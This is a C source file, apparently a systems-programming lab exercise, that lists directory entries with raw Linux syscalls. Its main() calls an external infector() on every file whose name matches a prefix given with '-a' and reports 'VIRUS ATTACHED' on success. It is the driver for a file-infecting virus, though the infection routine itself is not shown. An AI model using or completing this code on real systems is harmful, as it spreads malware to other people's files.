#include "util.h"

#define SYS_GETDENTS 141
#define STDOUT 1
#define STDERR 2
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6

extern int system_call();
extern void infection(void);
extern int infector(char *);  

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char          d_name[256];
};

void print_name(char* name, int virus_attached) {
    system_call(SYS_WRITE, STDOUT, name, strlen(name));
    if (virus_attached) {
        system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
    }
    system_call(SYS_WRITE, STDOUT, "\n", 1);
}

int should_ignore_file(char* filename) {
    if (strcmp(filename, ".") == 0 || strcmp(filename, "..") == 0)
        return 1;

    return 0;
}

int main(int argc, char* argv[]) {
    char* prefix = 0;
    char buf[8192];
    int fd, nread;
    struct linux_dirent *d;
    int bpos;
    
    int i;
    for(i = 1; i < argc; i++) {
        if(argv[i][0] == '-' && argv[i][1] == 'a') {
            prefix = &argv[i][2];
            break;
        }
    }
    
    fd = system_call(SYS_OPEN, ".", 0, 0);
    if (fd < 0) {
        return 0x55;
    }
    
    while(1) {
        nread = system_call(SYS_GETDENTS, fd, buf, 8192);
        if (nread == 0) {  
            break;
        }
        if (nread < 0) {   
            system_call(SYS_CLOSE, fd);
            return 0x55;
        }
        
        for (bpos = 0; bpos < nread;) {
            d = (struct linux_dirent *) (buf + bpos);
            
            if (!should_ignore_file(d->d_name)) {
                if (prefix && d->d_name[0] == prefix[0]) {
                    if (infector(d->d_name) == 1) {
                        print_name(d->d_name, 1);
                    } else {
                        print_name(d->d_name, 0);
                    }
                } else {
                    print_name(d->d_name, 0);
                }
            }
            
            bpos += d->d_reclen;
        }
    }
    
    system_call(SYS_CLOSE, fd);
    return 0;
}